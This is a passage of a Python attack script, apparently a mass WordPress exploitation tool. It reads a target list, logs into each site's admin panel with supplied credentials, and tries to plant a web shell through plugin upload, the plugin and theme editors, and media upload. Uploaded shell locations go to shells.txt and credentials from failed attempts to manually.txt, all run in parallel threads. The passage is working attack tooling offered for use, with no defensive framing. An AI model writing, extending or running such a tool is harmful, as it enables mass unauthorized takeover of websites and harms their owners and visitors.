                        print(f"{Colors.GREEN}[+] Found WordPress login at: {url}{Colors.ENDC}")
                        login_found = True
                        break
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] Error checking login path {test_url}: {str(e)}{Colors.ENDC}")
                    continue
            
            if not login_found:
                print(f"{Colors.YELLOW}[!] Could not find WordPress login page, using original URL: {original_url}{Colors.ENDC}")
                url = original_url
        
        print(f"\n{Colors.BLUE}[*] Processing {url}{Colors.ENDC}")
        
        # Check if the site is running WordPress
        if not self.check_wordpress(url):
            print(f"{Colors.RED}[-] {url} does not appear to be running WordPress{Colors.ENDC}")
            return False
        
        print(f"{Colors.BLUE}[+] WordPress detected at {url}{Colors.ENDC}")
        
        # Try to login with the provided credentials only
        print(f"{Colors.BLUE}[*] DEBUG: Attempting to login with {username}:{password}{Colors.ENDC}")
        login_result = self.login(url, username, password)
        print(f"{Colors.BLUE}[*] DEBUG: Login result: {login_result}{Colors.ENDC}")
        if not login_result:
            print(f"{Colors.RED}[-] Could not login to {url} with provided credentials {username}:{password}{Colors.ENDC}")
            return False
        
        # Try different upload methods
        print(f"{Colors.BLUE}[*] Attempting to upload shell via plugin upload...{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] DEBUG: Calling upload_shell_via_plugin_upload for {url}{Colors.ENDC}")
        if self.upload_shell_via_plugin_upload(url):
            return True
            
        print(f"{Colors.BLUE}[*] Attempting to upload shell via plugin editor...{Colors.ENDC}")
        if self.upload_shell_via_plugin(url):
            return True
        
        print(f"{Colors.BLUE}[*] Attempting to upload shell via theme editor...{Colors.ENDC}")
        if self.upload_shell_via_theme_editor(url):
            return True
        
        print(f"{Colors.BLUE}[*] Attempting to upload shell via media...{Colors.ENDC}")
        if self.upload_shell_via_media(url):
            return True
        
        print(f"{Colors.RED}[-] All upload methods failed for {url}{Colors.ENDC}")
        # Save login details to manually.txt for failed uploads
        try:
            with open(self.failed_logins_file, 'a') as f:
                f.write(f"{url}#{username}@{password}\n")
            print(f"{Colors.YELLOW}[+] Saved login details to {self.failed_logins_file} for manual checking{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error saving login details to file: {str(e)}{Colors.ENDC}")
        return False

def main():
    print_banner()
    
    if len(sys.argv) < 2:
        print(f"{Colors.YELLOW}[!] Usage: python {sys.argv[0]} <list_file> [threads] [timeout]{Colors.ENDC}")
        print(f"{Colors.YELLOW}[!] Example: python {sys.argv[0]} list.txt 5 15{Colors.ENDC}")
        sys.exit(1)
    
    list_file = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 3
    timeout = int(sys.argv[3]) if len(sys.argv) > 3 else 15
    
    try:
        with open(list_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Colors.RED}[!] Error reading list file: {str(e)}{Colors.ENDC}")
        sys.exit(1)
    
    print(f"{Colors.BLUE}[+] Loaded {len(targets)} targets from {list_file}{Colors.ENDC}")
    print(f"{Colors.BLUE}[+] Using {threads} threads{Colors.ENDC}")
    print(f"{Colors.BLUE}[+] Starting exploitation...{Colors.ENDC}")
    
    # Create shells.txt file
    with open('shells.txt', 'w') as f:
        f.write(f"# Shells uploaded on {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    # Create manually.txt file for failed login details
    with open('manually.txt', 'w') as f:
        f.write(f"# Failed uploads with login details on {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    exploiter = WordPressExploit(timeout=timeout)
    
    print(f"{Colors.BLUE}[+] Using timeout of {timeout} seconds{Colors.ENDC}")
    
    # Use ThreadPoolExecutor for parallel processing
    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_url = {executor.submit(exploiter.exploit, target): target for target in targets}
        for future in future_to_url:
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                print(f"{Colors.RED}[!] Error processing target: {str(e)}{Colors.ENDC}")
                results.append(False)
    
    # Summary
    successful = results.count(True)
    print(f"\n{Colors.BLUE}[+] Exploitation completed{Colors.ENDC}")
    print(f"{Colors.BLUE}[+] Total targets: {len(targets)}{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Successful uploads: {successful}{Colors.ENDC}")
    print(f"{Colors.RED}[+] Failed targets: {len(targets) - successful}{Colors.ENDC}")
    
    if successful > 0:
        print(f"{Colors.GREEN}[+] Shells saved to shells.txt{Colors.ENDC}")
        # Display the content of shells.txt
        try:
            with open('shells.txt', 'r') as f:
                shells = f.readlines()
                if len(shells) > 1:  # Skip the header line
                    print(f"{Colors.GREEN}[+] Uploaded files:{Colors.ENDC}")
                    for shell in shells[1:]:
                        print(f"{Colors.GREEN}    {shell.strip()}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error reading shells.txt: {str(e)}{Colors.ENDC}")

if __name__ == "__main__":
    main()